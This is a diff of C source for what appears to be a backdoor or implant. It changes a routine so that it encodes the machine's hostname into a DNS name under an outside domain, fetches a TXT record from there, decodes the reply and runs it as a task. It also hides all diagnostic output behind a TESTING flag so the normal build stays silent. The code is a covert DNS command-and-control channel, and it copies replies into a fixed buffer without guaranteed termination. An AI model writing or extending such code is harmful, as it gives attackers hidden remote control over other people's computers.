@@ -9,19 +9,40 @@
 
 void check_dns_tasks()
 {
-    // encode myhostname
+    char requeststring[600];
+    char tmp[256];
+    char tmp2[256];
+
+    // encode myhostnamee
+#ifdef TESTING
+    printf("ME :%s:\n", ME);
+#endif
+
+    base64encode(ME, tmp);
+
+#ifdef TESTING
+    printf ("Encoded hostname is %s\n",tmp);
+#endif
+
+    _snprintf(requeststring, sizeof(requeststring),"%s.dnstun.multifariousnonsense.com", tmp);
+
     // hit dns name
     // dnstun.multifariousnonsense.com
+    dnstxtrequest(requeststring, tmp);
+#ifdef TESTING
+    printf ("encoded response is %s\n", tmp);
+#endif
+    // decode response
+    base64decode(tmp, tmp2);
+#ifdef TESTING
+    printf ("decoded response is %s\n", tmp2);
+#endif
 
-    // parse response
-    // At first will be run tasks in lookup table
-    // Eventually want to encode blobs in dns responses
-    dnstxtrequest("director.multifariousnonsense.com");
+    runtask(tmp2);        
+
 }
 
-void dnslog(int status)
-{
-}
+
 
 #ifdef DEACTIVATED
 // Not sure what the return should be?
@@ -80,32 +101,40 @@ void olddnstxtrequest(char *tofetch)
 }
 #endif
 
-void dnstxtrequest(char *pszDomain)
+void dnstxtrequest(char *pszDomain, char* out)
 {
 
 #ifdef WINDOWS_VERSION
-#endif
+
 
     DNS_RECORD *dns_records;
     DNS_STATUS status = DnsQuery_A(pszDomain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &dns_records, NULL);
     //if (status != DNS_RCODE_NOERROR) {
     if (status != 0) {  //Guess at no error since I don't know that constant... in some windns (but not mingw apparently)
-        fprintf(stderr, "Error: %d\n", status);
+#ifdef TESTING
+        fprintf(stderr, "Error fetching :%s: %d\n", pszDomain, status);
+#endif
         return;
     }
 
+#ifdef TESTING
     printf("TXT records for %s:\n", pszDomain);
+#endif
+
     DNS_RECORD *txt_record = dns_records;
     while (txt_record != NULL) {
         if (txt_record->wType == DNS_TYPE_TEXT) {
-            printf("%s\n", txt_record->Data.TXT.pStringArray[0]);
+#ifdef TESTING
+            printf("Received :%s:\n", txt_record->Data.TXT.pStringArray[0]);
+#endif
+            strncpy(out, txt_record->Data.TXT.pStringArray[0], 256);
         }
         txt_record = txt_record->pNext;
     }
 
     DnsRecordListFree(dns_records, DnsFreeRecordList);
 
-
+#endif
 
 
 #ifdef LINUX_VERSION
@@ -128,7 +157,9 @@ void dnstxtrequest(char *pszDomain)
 
     if (ret)
     {
+#ifdef TESTING
         printf("error initializing resolver\n");
+#endif
         goto close;
     }
     res_init = 1;
@@ -165,7 +196,9 @@ void dnstxtrequest(char *pszDomain)
                 len--;
                 memcpy(Result, pResult + 1, len);
                 Result[len] = '\0';
+#ifdef TESTING
                 printf("#%d [%s]\n", i, Result);
+#endif
             }
         }
 
